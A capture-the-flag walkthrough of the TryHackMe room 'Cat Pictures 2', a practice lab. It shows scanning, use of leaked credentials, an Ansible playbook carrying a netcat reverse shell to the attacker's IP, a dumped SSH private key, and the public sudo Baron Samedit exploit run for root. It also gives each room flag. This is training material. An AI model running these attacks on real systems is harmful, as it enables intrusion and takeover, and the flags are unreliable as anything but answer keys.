## Index

1. [Setup](#setup)
2. [Reconnaissance](#reconnaissance)
3. [Gaining Access](#gaining-access)
4. [Privilege Escalation](#privilege-escalation)
5. [Conclusion](#conclusion)

## Setup 

We first need to connect to the tryhackme VPN server. You can get more information regarding this by visiting the [Access](https://tryhackme.com/access) page.

I'll be using `openvpn` to connect to the server. Here's the command:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Reconnaissance

Starting off with some basic recon:
```shell-session
$ rustscan -b 4500 -a 10.10.51.5 --ulimit 5000 -t 2000 -r 1-65535 -- -sC -oN rustscan_port_scan.txt
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
| ssh-hostkey: 
|   2048 33:f0:03:36:26:36:8c:2f:88:95:2c:ac:c3:bc:64:65 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWn7oP+xezi54hhxJR3FAOcCt9gU+ZfOXquxFX/NC6USigzwXcxw2B4P3Yz6Huhaox1WRRgOSAYPJp9uo1gnA+ttkVdRaIqmcizbsznuU6sXntwiunD/QDNegq5UwJI3PjQu05HhnTNwGlBuiv+V/HW2OZGo0LLMY8ixqphCtAbw5uQZsV28rB2Yy1C7FYjkRzfhGePOfyq8Ga4FSpRnWz1vHYyEzFiF9tyLXNcDEdIWalKA6hrr7msEneSITE/RrGt5tynn6Rq5/3Os0mdbV0ztvqavwcWRR6B1UAJ+zPR/GKJ6s4Zr8ImoAXIZc7lFQ7Oh8DVWYp4cearg90RZUx
|   256 4f:f3:b3:f2:6e:03:91:b2:7c:c0:53:d5:d4:03:88:46 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFhoBFkSKYS/dRjYASX26cs3gtgKxnLhhnXBas1fJ5i32J7h9+X8XA3GHT2SzP8/CBbs759W5q68jDA9nsTYnzo=
|   256 13:7c:47:8b:6f:f8:f4:6b:42:9a:f2:d5:3d:34:13:52 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMiQc+7IBNNbs8nZJ4L+ntHTLbWn0Xn5b+QnWuboKE6r
80/tcp   open  http       syn-ack
| http-robots.txt: 7 disallowed entries 
|_/data/ /dist/ /docs/ /php/ /plugins/ /src/ /uploads/
| http-git: 
|   10.10.51.5:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|       https://github.com/electerious/Lychee.git
|_    Project type: PHP application (guessed from .gitignore)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Lychee
|_http-favicon: Unknown favicon MD5: 60D8216C0FDE4723DCA5FBD03AD44CB7
222/tcp  open  rsh-spx    syn-ack
1337/tcp open  waste      syn-ack
3000/tcp open  ppp        syn-ack
8080/tcp open  http-proxy syn-ack
|_http-title: Welcome to nginx!
| http-methods: 
|_  Supported Methods: GET HEA

$ rustscan -b 4500 -a 10.10.51.5 --ulimit 5000 -t 2000 -p 22,80,222,1337,8080,3000  -- -sV -oN rustscan_service_scan.txt
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack nginx 1.4.6 (Ubuntu)
222/tcp  open  ssh     syn-ack OpenSSH 9.0 (protocol 2.0)
1337/tcp open  waste?  syn-ack
3000/tcp open  ppp?    syn-ack
8080/tcp open  http    syn-ack SimpleHTTPServer 0.6 (Python 3.6.9)
...
```

Cool! So we have some basic info. There's some unknown services running on 1337 and 3000. There's 2 http servers we can access, one on 80 and the other on 8080.
Let's see what the target has for us...
Port 80:
![](port-80.png)

Port 8080:
![](port-8080.png)

Interesting, so on port 8080 it's just the plain ol' nginx homepage, and on port 80 there's... well, cat pictures!
Inspecting these images, we come across this:
![](metadata-hint.png)

Let's download this image and examine it, shall we?
```shell-session
$ wget http://10.10.51.5/uploads/big/f5054e97620f168c7b5088c85ab1d6e4.jpg
$ exiftool f5054e97620f168c7b5088c85ab1d6e4.jpg
ExifTool Version Number         : 12.63
File Name                       : f5054e97620f168c7b5088c85ab1d6e4.jpg
Directory                       : .
File Size                       : 73 kB
File Modification Date/Time     : 2023:07:14 19:08:42-04:00
File Access Date/Time           : 2023:07:14 19:08:57-04:00
File Inode Change Date/Time     : 2023:07:14 19:08:42-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Profile CMM Type                : Little CMS
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2012:01:25 03:41:57
Profile File Signature          : acsp
Primary Platform                : Apple Computer Inc.
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 0
Profile Description             : c2
Profile Copyright               : IX
Media White Point               : 0.9642 1 0.82491
Media Black Point               : 0.01205 0.0125 0.01031
Red Matrix Column               : 0.43607 0.22249 0.01392
Green Matrix Column             : 0.38515 0.71687 0.09708
Blue Matrix Column              : 0.14307 0.06061 0.7141
Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)
XMP Toolkit                     : Image::ExifTool 12.49
Title                           : :8080/764efa883dda1e11db47671c4a3bbd9e.txt
Image Width                     : 720
Image Height                    : 1080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 720x1080
Megapixels                      : 0.778
```

The `Title` field shows text that suspisiously looks like a URL path to a text file, let's see if we can `wget` it:
```shell-session
$ wget http://10.10.51.5:8080/764efa883dda1e11db47671c4a3bbd9e.txt
...
$ cat 764efa883dda1e11db47671c4a3bbd9e.txt 
note to self:

I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
This file isn't easy to find anyway unless you have the correct url...

gitea: port 3000
user: samarium
password: TUmhyZ37CLZrhP

ansible runner (olivetin): port 1337
```

Yep, it's a memo/note. Looks like the service running on port 3000 is `Gitea` and the author's gone and given us the credentials to access the panel. Honestly... It'd be a crime _not_ to snoop about now ;)
Signing into the service using a browser, we're taken to:
![](gitea-dash.png)

One of the commits mentions adding a flag, and fair enough, if we navigate to the file committed, we get our first flag:

> What is Flag 1?
> 
> Answer: `10d916eaea54bb5ebe36b59538146bb5`

## Gaining Access

The note/memo also mentions something on port 1337, let's check that. 
![](port-1337.png)

Nice, so there's a couple of options for RCE. The most simple one is to modify the `playbook.yml` file in the `ansible` repo and launch the `Run Playbook` action on port 1337. Here's the modified `playbook.yml`:
```yml
---
- name: Test 
  hosts: all                                  # Define all the hosts
  remote_user: bismuth                                  
  # Defining the Ansible task
  tasks:             
    - name: get the username running the deploy
      become: false
      command: whoami
      register: username_on_the_host
      changed_when: false

    - debug: var=username_on_the_host

    - name: Test
      shell: echo hi

    - name: revshell
      shell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.11.5.201 4444 >/tmp/f
```

Now, if we start a netcat listener on a session and launch the action from the 1337 portal, we should recieve a nice reverse shell connection:
```shell-session
$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.11.5.201] from (UNKNOWN) [10.10.51.5] 54020
bismuth@catpictures-ii:~$ 
```

BINGO! Now let's do some enumeration and look for more flags:
```shell-session
## Frist we need to stablilize the shell:
bismuth@catpictures-ii:~$ which python3
which python3
/usr/bin/python3

bismuth@catpictures-ii:~$ python3 -c "import pty; pty.spawn('/bin/bash')"
python3 -c "import pty; pty.spawn('/bin/bash')"

bismuth@catpictures-ii:~$ ^Z
zsh: suspended  nc -nvlp 4444

$ stty raw -echo && fg                                        

[1]  + continued  nc -nvlp 4444
                               export TERM=xterm-256-color
bismuth@catpictures-ii:~$ ## Cool! The shell's been stabilized. Now let's look for flags :)
bismuth@catpictures-ii:~$ ls -la
total 56
drwxr-xr-x 8 bismuth bismuth 4096 Mar 20 08:58 .
drwxr-xr-x 3 root    root    4096 Nov  7  2022 ..
drwxr-xr-x 3 bismuth bismuth 4096 Nov  7  2022 .ansible
lrwxrwxrwx 1 bismuth bismuth    9 Nov  7  2022 .bash_history -> /dev/null
-rw-r--r-- 1 bismuth bismuth  220 Nov  7  2022 .bash_logout
-rw-r--r-- 1 bismuth bismuth 3771 Nov  7  2022 .bashrc
drwx------ 2 bismuth bismuth 4096 Nov  7  2022 .cache
drwxr-x--- 3 bismuth bismuth 4096 Nov  7  2022 .config
-rw-rw-r-- 1 bismuth bismuth   33 Mar 20 08:58 flag2.txt
drwx------ 3 bismuth bismuth 4096 Nov  7  2022 .gnupg
-rw------- 1 bismuth bismuth   43 Nov  7  2022 .lesshst
drwxrwxr-x 2 bismuth bismuth 4096 Nov  7  2022 .nano
-rw-r--r-- 1 bismuth bismuth  655 Nov  7  2022 .profile
drwx------ 2 bismuth bismuth 4096 Nov  7  2022 .ssh
-rw-r--r-- 1 bismuth bismuth    0 Nov  7  2022 .sudo_as_admin_successful
-rw-rw-r-- 1 bismuth bismuth  182 Nov  7  2022 .wget-hsts

bismuth@catpictures-ii:~$ cat flag2.txt
5e2cafbbf180351702651c09cd797920
```

> What is Flag 2?
> 
> Answer: `5e2cafbbf180351702651c09cd797920`

```shell-session
bismuth@catpictures-ii:~$ whoami
bismuth

bismuth@catpictures-ii:~$ uname -a
Linux catpictures-ii 4.15.0-206-generic #217-Ubuntu SMP Fri Feb 3 19:10:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

bismuth@catpictures-ii:~$ cat /etc/os-release 
NAME="Ubuntu"
VERSION="18.04.6 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.6 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic

bismuth@catpictures-ii:~$ cat /etc/issue   
Ubuntu 18.04.6 LTS \n \l

bismuth@catpictures-ii:~$ id    
uid=1000(bismuth) gid=1000(bismuth) groups=1000(bismuth),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare)
bismuth@catpictures-ii:~$ find / -perm /u=s,g=s 2>/dev/null
```

Before proceeding, it's best if we get the ssh private key for later access:
```shell-session
bismuth@catpictures-ii:~$ cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA2epfgbqSrWGvHLh3a3K2X/6flpaL2ccuKMjnkBfxJhPK721K
uuqJIyB0iMoWmBFo+10TX3L8LRd5rgVKiTyv0QhVcHX2tFK5ma88a2xAuaMe5BJP
DwDkVfS2lnxgfBO9U4d73IK7963QwMF3u98bueJZkKkrFr4jfvbkDJOP24a95H4v
iYxjtXZut3vPlaONXwPzQfhV/cPRaSKHTQFcSkyn8hllxTF29ZPyDYAkSFytlJ33
epDVy/fv2Fc8mKCg+tKWEfsh2E3QPM2pXuAhXKVAyxK2RUnBNNZ4V+aYe3AmL6Q8
1BNDvSN+K04N3KanmFgrnIwOYvYUfTPdVIoVhwIDAQABAoIBAQDGoiawf7qXpEUU
bukb3hJzagtaHpwXxMFEl+zLoadEyCHhIMRPoN2kUT8oON1je+svxOWVyaAoEg/u
GhCZC+JPLcODoWNhd06K0frHCIPvMstDpZS+3ldEKq4Meg8QyoV3EDZNCDYCTEPO
kAtuCq6hP7vYavtF3cdJQg8Zj6A/vuCCDcmttDN/LDcUOaEQd5e/aYL66wUViVxu
HTu6cD6IT4VTD+N2ZObaYZbA3Evng0pS64OLlilhmomrcZGGbwV+BVOcnkF/fbD9
U486bH1h+F6VmX8KOjGgL/6UvcoE20T9hPkoJOhNMDo7K1dfuIkaMJu/2QIdf7Bc
+zvGEspBAoGBAP+0xSiQkw0IxcPY4BIOph/xfm2uEVWl1lH/11eN4Y8JsjLYIux0
5E2EIWeEYZx4BM1QtwqTO9ZjbnG7rbNV5Ck6jCA2tmxR77SdBuyKokswgdGgA9Ai
/2arzy+kSMDrRnVxD1XQ+5urcfjAwzrYN98iezNJ1V/TB8E4+xXiWvh3AoGBANoq
fBlOvfjr9e9s2Hv+r7T2sPCHyIYSFSwAv7/ftdq9h88b6Wa2w2YTZgpFtKt4EWHa
rfZPQyYzWxorHaYO9TlB2C6XRMBeMy74+EhlN5bgGYYp5prmqIwDO2HhHf0gQeus
cjJNKR8vY4wASKoNmGP7dyQeIydQQEVYPqwrFB9xAoGAOS30NJj3uR9wEdZqbL9H
2LbI3b/h8nQOE/IQ9mwsty6k4YfBb3zIHKliSuKobTPNZxgYhk3cQJmlddtRAVxA
lBOaiA2UB27fGlVO2hA6MHQdY4HTuHRLBmt+/hlPh4xVCigJFNiRmwLgjo6UWZFG
FSiBwjtNcosfHc8fHoqqawsCgYEAs5SpFkPkyFOi23RjNp3MkE9IEpYSj5mu58uu
Cwjgrq+4bNjy5OOoMAvjwKzkLQjmdgAFlmxkP7uiUAYRn7FMVddHVgKaSya/RvkV
lrIKch0BpZg0BGm9b5LxfH5LqyK0YIRQc+tj4BGoBYPuTFxohlRmG8ra8O90GCCt
ZhcHt2ECgYEAgB3lB0wO5ZP+T84RWE0cQNKs3aMXqgU9IMN5qHdt9faDG7bVt8aY
gnff4aoDJsz6mV+xjeVRONDgNCBtS8/vE4OW+MRoXrLoK35CDg6MtBL8rxDwx7aC
PXrqJoUuYPPMjeeqcv0LbXDT3a/mkj074aB5LWcEYxNkIyJGC5EbRkU=
-----END RSA PRIVATE KEY-----
```

Copy paste into your system and do something like
```shell-session
$ chmod 600 id_rsa
## Log back in:
$ ssh bismuth@10.10.51.5 -i id_rsa
...
bismuth@catpictures-ii:~$ 
```

## Privilege escalation

Let's get `linpeas` for the enumeration so we can find some vector for privesc:
```shell-session
## On our machine:
$ python3 -m http.server 8000

## On target ssh session:
bismuth@catpictures-ii:~$ wget http://10.11.5.201:8000/linpeas.sh
bismuth@catpictures-ii:~$ sh linpeas.sh
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
```

So the target has a vulnerable version of `sudo`. Let's exploit that:
```shell-session
bismuth@catpictures-ii:~$ mkdir temp && cd temp
bismuth@catpictures-ii:~/temp$ git clone https://github.com/blasty/CVE-2021-3156.git
Cloning into 'CVE-2021-3156'...
FAILED
```

Since the machine won't let us clone the repo, we can transfer it from our attacking machine:
```shell-session
$ scp -i id_rsa -r CVE-2021-3156-main bismuth@10.10.51.5:/home/bismuth/temp/
README.md                                                 100% 1187     7.4KB/s   00:00    
brute.sh                                                  100% 1994    12.3KB/s   00:00    
lib.c                                                     100%  407     2.6KB/s   00:00    
Makefile                                                  100%  264     1.6KB/s   00:00    
hax.c                                                     100% 4420    26.5KB/s   00:00
```

```shell-session
bismuth@catpictures-ii:~/temp$ ls   
CVE-2021-3156-main
bismuth@catpictures-ii:~/temp$ cd CVE-2021-3156-main/

bismuth@catpictures-ii:~/temp/CVE-2021-3156-main$ make
rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c

## Since the target is running Ubuntu 18.04, the target number specified should be 0
bismuth@catpictures-ii:~/temp/CVE-2021-3156-main$ ./sudo-hax-me-a-sandwich 0 
** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **
[+] bl1ng bl1ng! We got it!
# whoami
root
# ls /root
ansible  docker-compose.yaml  flag3.txt  gitea
# cat /root/flag3.txt
6d2a9f8f8174e86e27d565087a28a971
```

> What is Flag 3?
> 
> Answer: `6d2a9f8f8174e86e27d565087a28a971`


## Conclusion
If this writeup helps, please consider following me on [github](https://github.com/NovusEdge) and/or dropping a star on the repository: https://github.com/NovusEdge/thm-writeups

---

- Author: Aliasgar Khimani
- Room: [Cat Pictures 2](https://tryhackme.com/room/catpictures2)
